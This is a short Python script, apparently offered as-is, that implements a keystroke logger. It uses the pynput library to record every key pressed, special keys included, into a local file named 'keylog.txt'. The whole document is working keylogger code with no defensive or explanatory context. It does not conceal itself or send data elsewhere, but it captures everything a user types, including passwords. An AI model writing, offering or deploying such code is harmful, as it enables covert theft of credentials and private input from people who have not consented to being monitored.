from pynput import keyboard

# Define the path to the log file
log_file_path = "keylog.txt"

def on_press(key):
    try:
        # Try to get the character of the key pressed
        key_char = key.char
    except AttributeError:
        # Special keys (like shift, ctrl, etc.)
        key_char = str(key)

    # Open the log file in append mode and write the key
    with open(log_file_path, "a") as log_file:
        log_file.write(f"{key_char}\n")

# Create a listener for the keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
